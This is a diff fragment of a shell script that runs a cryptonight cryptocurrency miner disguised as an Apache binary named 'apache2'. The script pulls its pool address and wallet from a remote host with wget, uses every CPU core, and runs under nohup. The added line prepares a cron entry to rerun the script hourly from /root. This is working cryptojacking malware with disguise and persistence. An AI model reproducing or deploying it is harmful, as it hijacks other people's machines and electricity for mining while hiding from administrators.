@@ -19,6 +19,6 @@ chmod +x apache2
 chmod +x apache.sh
 
 nohup ./apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &
-
+echo '55 * * * * /root/apache.sh &> /root/out.log'
 sleep 2
 tail -f nohup.out
